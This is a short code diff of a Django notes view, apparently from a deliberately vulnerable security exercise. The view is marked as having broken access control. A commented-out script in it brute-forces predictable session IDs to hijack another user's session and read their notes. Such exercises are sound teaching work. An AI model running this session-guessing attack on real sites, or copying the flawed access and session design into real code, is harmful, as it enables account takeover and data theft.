@@ -37,17 +37,16 @@ def notes(request, username):#broken access control: users can see other users' 
 
     notes = get_user_notes(username)
 
-    #potential way of hijacking a session
-    #memo for essay
+    #potential way of hijacking a session with predictable sessionid
     '''
-    address = 'http://127.0.0.1:8000'
+    address = #<localhost:8000>
     b_address = address + '/notes/' + username + '/'
-    for sid in range(1, 10):
-        session = 'session-' + str(sid)
-        r = requests.get(b_address, cookies = {'sessionid': session})
-        text = json.loads(r.text)
-        if text['username'] == 'emailtest':
-            print(text)
+    for sessionid_int in range(1, 100):
+        session = 'session-' + str(sessionid_int)
+        requested_session = requests.get(b_address, cookies = {'sessionid': session})
+        requested_session_text = json.loads(requested_session.text)
+        if requested_session_text['username'] == #<username>:
+            print(requested_session_text)
     '''
 
     return render(request, 'notes.html', {'notes': notes, 'logged_in_user': logged_in_user})
